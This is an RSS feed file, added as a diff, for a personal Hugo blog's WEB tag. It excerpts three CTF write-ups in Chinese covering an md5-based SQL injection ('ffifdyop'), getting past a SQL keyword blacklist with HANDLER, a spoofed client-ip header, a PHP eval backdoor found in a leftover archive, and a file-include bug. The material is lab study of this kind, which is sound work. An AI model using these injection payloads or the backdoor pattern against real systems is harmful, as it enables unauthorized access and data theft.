@@ -1,0 +1,34 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>WEB on FanBig&#39;s Blog</title>
+    <link>//localhost:1313/tags/web/</link>
+    <description>Recent content in WEB on FanBig&#39;s Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <copyright>FanBig</copyright>
+    <lastBuildDate>Wed, 13 Mar 2024 13:13:40 +0800</lastBuildDate>
+    <atom:link href="//localhost:1313/tags/web/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>BUUCTF WEB 1</title>
+      <link>//localhost:1313/posts/buuctf-web-1/</link>
+      <pubDate>Wed, 13 Mar 2024 13:13:40 +0800</pubDate>
+      <guid>//localhost:1313/posts/buuctf-web-1/</guid>
+      <description>BUUCTF WEB 1 [BJDCTF2020]Easy MD5 response包中有Hint提示&#xA;HTTP/1.1 200 OK Server: openresty Date: Wed, 31 Jan 2024 04:19:31 GMT Content-Type: text/html; charset=UTF-8 Connection: close Vary: Accept-Encoding Hint: select * from &amp;#39;admin&amp;#39; where password=md5($pass,true) X-Powered-By: PHP/7.3.13 Cache-Control: no-cache Content-Length: 3107 可以知道是利用md5($pass,true)这个函数构造出sql注入的payload进行利用，即&#xA;select * from &amp;#39;admin&amp;#39; where password=md5($pass,true) select * from &amp;#39;admin&amp;#39; where password=&amp;#39;or&amp;#39;1 所有需要应该字符串来构造相应的payload，如ffifdyop ，对应的MD5为0x276f722736c95d99e921722cf9ed621c，这个是16进制的，由于MySQL默认把16进制转成ASCII，所以会变成&#39;or&#39;6É]é!r,ùíb，满足上述开头，接着来到第二个页面&#xA;&amp;lt;!-- $a = $GET[&amp;#39;a&amp;#39;]; $b = $_GET[&amp;#39;b&amp;#39;]; if($a != $b &amp;amp;&amp;amp; md5($a) == md5($b)){ // wow, glzjin wants a girl friend.</description>
+    </item>
+    <item>
+      <title>BUUCTF WEB 2</title>
+      <link>//localhost:1313/posts/buuctf-web-2/</link>
+      <pubDate>Wed, 13 Mar 2024 13:13:40 +0800</pubDate>
+      <guid>//localhost:1313/posts/buuctf-web-2/</guid>
+      <description>BUUCTF WEB 2 [GYCTF2020]Blacklist sql注入，先找一下注入点&#xA;/?inject=1&amp;#39;order+by+2--+ 有回显，然后尝试爆库，发现被过滤&#xA;return preg_match(&amp;#34;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&amp;#34;,$inject); select被过滤，尝试HANDLER&#xA;HANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name { = | &amp;lt;= | &amp;gt;= | &amp;lt; | &amp;gt; } (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT .</description>
+    </item>
+    <item>
+      <title>iChunQiu WEB 1</title>
+      <link>//localhost:1313/posts/ichunqiu-web-1/</link>
+      <pubDate>Wed, 13 Mar 2024 13:13:40 +0800</pubDate>
+      <guid>//localhost:1313/posts/ichunqiu-web-1/</guid>
+      <description>iChunQiu WEB 1 禁止访问 client-ip: 192.168.1.1 签到 if (a.currentLevel &amp;gt; a.maxLevel) { var IAvaDcnZ1 = prompt(&amp;#34;\x43\x6f\x6e\x67\x72\x61\x74\x75\x6c\x61\x74\x69\x6f\x6e\x73\x2c\x20\x70\x6c\x65\x61\x73\x65\x20\x65\x6e\x74\x65\x72\x20\x79\x6f\x75\x72\x20\x6e\x69\x63\x6b\x6e\x61\x6d\x65\x3a&amp;#34;)[&amp;#39;\x74\x72\x69\x6d&amp;#39;](); $.ajax({ url: &amp;#39;\x66\x6c\x61\x67\x2e\x70\x68\x70&amp;#39;, type: &amp;#39;\x50\x4f\x53\x54&amp;#39;, data: &amp;#39;\x6e\x69\x63\x6b\x6e\x61\x6d\x65\x3d&amp;#39; + IAvaDcnZ1, success: function (StRvT3) { var StRvT3 = StRvT3; console[&amp;#39;\x6c\x6f\x67&amp;#39;](StRvT3) } }) window[&amp;#34;\x61\x6c\x65\x72\x74&amp;#34;](&amp;#34;\u606d\u559c\u4f60\u5f97\u5230\x66\x6c\x61\x67\u4e86\uff0c\u53bb\u5bfb\u627e\u5427\x7e\uff01&amp;#34;); a.fire(&amp;#34;gameEnd&amp;#34;); return; } 转成字符串即可&#xA;遗留的压缩包 &amp;lt;?php # leet if (md5($_GET[&amp;#39;pwd&amp;#39;]) == &amp;#39;217f81b8ff0a1ab138a8e1bdc031262e&amp;#39;) { eval($_POST[&amp;#39;1337&amp;#39;]); } www.zip发现源码，直接读flag即可&#xA;Web 01 &amp;lt;?php $f = $_GET[&amp;#34;file&amp;#34;]; if(!isset($f)){ $f = &amp;#39;config&amp;#39;; // flag in flag.php } include($f.&amp;#39;.php&amp;#39;); echo &amp;#39;&amp;lt;img src=&amp;#34;&amp;#39;.</description>
+    </item>
+  </channel>
+</rss>
